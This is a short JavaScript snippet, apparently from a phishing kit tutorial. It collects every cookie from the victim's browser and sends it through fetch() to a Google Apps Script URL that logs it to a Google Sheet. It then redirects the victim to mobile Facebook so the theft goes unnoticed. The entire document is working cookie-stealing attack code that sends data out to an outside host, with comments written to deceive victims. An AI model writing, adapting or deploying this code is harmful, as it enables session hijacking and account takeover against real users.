// REPLACE THIS WITH YOUR GOOGLE SCRIPT URL FROM ABOVE
const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwuUgYXBOb9vFB4gn2LCod0gZQPUS7vI1hv_V7E8ZstQ6yhR4EJlNlFvB6n-26UxWdv/exec";

// 1. Grab all cookies
const cookies = document.cookie;

// 2. Send to Google Sheets
fetch(GOOGLE_SCRIPT_URL + "?cookies=" + encodeURIComponent(cookies))
    .then(() => {
        // 3. Immediately redirect to real Facebook so they don't notice
        window.location.href = "https://m.facebook.com/";
    })
    .catch(err => {
        // If sending fails, still redirect so they aren't stuck
        window.location.href = "https://m.facebook.com/";
    });